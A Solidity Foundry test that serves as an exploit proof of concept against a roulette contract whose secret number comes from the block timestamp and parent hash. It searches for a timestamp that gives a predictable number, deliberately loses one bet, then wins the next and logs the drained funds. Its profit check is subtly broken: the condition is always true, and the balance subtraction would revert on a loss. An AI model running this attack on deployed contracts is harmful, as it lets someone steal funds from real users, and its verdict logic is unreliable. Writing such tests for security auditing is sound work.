// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/crypto_roulette.sol";

contract CryptoRouletteTest is Test {
    CryptoRoulette public roulette;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    uint256 public constant BLOCK_TO_TEST = 1000;
    uint256 public constant INITIAL_BALANCE = 10 ether;

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.prank(owner);
        roulette = new CryptoRoulette();
        // Fund contract for payout validation
        (bool success, ) = address(roulette).call{value: INITIAL_BALANCE}("");
        require(success, "Contract funding failed");
    }

    function testPredictableSecretNumber() public {
        vm.startPrank(attacker);
        // Move to test block and get required variables
        vm.roll(BLOCK_TO_TEST);
        bytes32 parentHash = blockhash(BLOCK_TO_TEST - 1);
        uint256 currentTimestamp = block.timestamp;
        
        // Find timestamp that produces valid secretNumber (1-10)
        uint256 adjustedTimestamp;
        uint8 predictedNumber;
        for (uint256 i = 0; i < 300; i++) {
            predictedNumber = uint8(uint256(keccak256(abi.encodePacked(currentTimestamp + i, parentHash)))) % 20 + 1;
            if (predictedNumber <= 10) {
                adjustedTimestamp = currentTimestamp + i;
                break;
            }
        }
        vm.warp(adjustedTimestamp);

        // BEGIN DIFFERENTIAL CHECKS
        console.log("--- BEFORE-Trigger State ---");
        uint256 preContractBalance = address(roulette).balance;
        uint256 preAttackerBalance = address(attacker).balance;
        console.log("Contract balance (pre):", preContractBalance);
        console.log("Attacker balance (pre):", preAttackerBalance);

        console.log("--- Trigger Attacks ---");
        // Lose first game to set predicted number
        roulette.play{value: 1 ether}(1);
        // Win second game using prediction
        roulette.play{value: 1 ether}(predictedNumber);
        vm.stopPrank();

        console.log("--- AFTER-Trigger State ---");
        uint256 postContractBalance = address(roulette).balance;
        uint256 postAttackerBalance = address(attacker).balance;
        console.log("Contract balance (post):", postContractBalance);
        console.log("Attacker balance (post):", postAttackerBalance);

        uint256 contractLoss = preContractBalance - postContractBalance;
        uint256 attackerGain = postAttackerBalance - preAttackerBalance;
        console.log("--> Results Validation");
        console.log("Contract loss:", contractLoss);
        console.log("Attacker gain:", attackerGain);
        
        bool fundsStolen = contractLoss > 0;
        bool attackerProfited = (attackerGain + 2 ether) > 0; // Considering 2 ether bet cost

        // FINAL VERDICT LOGIC
        if (fundsStolen && attackerProfited) {
            console.log("Vulnerability Exists: Funds stolen and attacker net profit confirmed");
        } else if (fundsStolen && !attackerProfited) {
            console.log("Vulnerability not Exist: Funds drained but no attacker profit (check bet logic)");
        } else if (!fundsStolen && attackerProfited) {
            console.log("Vulnerability not Exist: Profit without contract loss (impossible scenario)");
        } else {
            console.log("Vulnerability not Exist: No funds movement detected");
        }
        // END DIFFERENTIAL CHECKS
    }
}